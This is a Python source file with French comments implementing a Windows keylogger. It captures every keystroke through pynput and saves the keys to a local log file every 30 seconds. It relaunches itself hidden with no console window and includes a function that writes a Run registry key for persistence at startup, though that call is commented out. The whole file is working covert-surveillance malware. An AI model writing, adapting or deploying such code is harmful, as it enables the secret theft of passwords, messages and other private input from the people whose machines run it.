from pynput import keyboard
import os
import subprocess
import threading
import time
import winreg

# Chemins pour le dossier et les fichiers
base_dir = "C:\\temp"
log_file = os.path.join(base_dir, "logs.txt")
error_file = os.path.join(base_dir, "error.txt")
script_path = os.path.abspath(__file__)  # Chemin absolu du script en cours

# Vérifier ou créer les dossiers nécessaires
if not os.path.exists(base_dir):
    os.makedirs(base_dir)

if not os.path.exists(log_file):
    with open(log_file, "w", encoding="utf-8") as f:
        f.write("")

if not os.path.exists(error_file):
    with open(error_file, "w", encoding="utf-8") as f:
        f.write("")

# Buffer pour stocker les frappes temporairement
key_buffer = []
shift_pressed = False  # Indicateur pour majuscules

# Fonction pour ajouter le script au démarrage
def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, f"pythonw.exe \"{script_path}\"")
        winreg.CloseKey(key)
    except Exception as e:
        log_error(f"Erreur lors de l'ajout au démarrage : {e}")

# Fonction pour exécuter le script en mode masqué
def run_hidden():
    try:
        if not os.environ.get("IS_RUNNING_HIDDEN"):
            os.environ["IS_RUNNING_HIDDEN"] = "1"
            subprocess.Popen(["pythonw.exe", script_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            exit()
    except Exception as e:
        log_error(f"Erreur lors de l'exécution masquée : {e}")

# Fonction pour sauvegarder les frappes toutes les 30 secondes
def save_log_periodically():
    while True:
        time.sleep(30)
        try:
            if key_buffer:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write("".join(key_buffer))
                key_buffer.clear()
        except Exception as e:
            log_error(f"Erreur lors de la sauvegarde : {e}")

# Fonction pour enregistrer les erreurs
def log_error(error):
    try:
        with open(error_file, "a", encoding="utf-8") as f:
            f.write(f"{error}\n")
    except:
        pass

# Fonction pour capturer les frappes clavier
def on_press(key):
    global shift_pressed
    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif hasattr(key, 'char') and key.char:  # Capturer les caractères normaux
            char = key.char
            if shift_pressed:  # Convertir en majuscules si Shift est pressé
                char = char.upper()
            key_buffer.append(char)
        elif key == keyboard.Key.space:  # Capturer les espaces
            key_buffer.append(" ")
        elif key == keyboard.Key.enter:  # Capturer les retours à la ligne
            key_buffer.append("\n")
        elif key == keyboard.Key.tab:  # Capturer les tabulations
            key_buffer.append("\t")
        elif key == keyboard.Key.backspace:  # Gérer les backspaces
            handle_backspace()
    except Exception as e:
        log_error(f"Erreur lors de la capture : {e}")

# Fonction pour gérer le relâchement des touches
def on_release(key):
    global shift_pressed
    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = False
    except Exception as e:
        log_error(f"Erreur lors du relâchement de la touche : {e}")

# Fonction pour gérer le BACKSPACE directement dans le buffer
def handle_backspace():
    try:
        if key_buffer:
            key_buffer.pop()
    except Exception as e:
        log_error(f"Erreur lors de la gestion du BACKSPACE : {e}")

# Exécuter une fois pour ajouter au démarrage et masquer l'exécution
if __name__ == "__main__":
    if not os.environ.get("IS_RUNNING_HIDDEN"):
        #add_to_startup()
        run_hidden()

    # Thread pour sauvegarder les frappes périodiquement
    log_thread = threading.Thread(target=save_log_periodically, daemon=True)
    log_thread.start()

    # Écoute des frappes clavier
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        log_error(f"Erreur dans le keylogger : {e}")
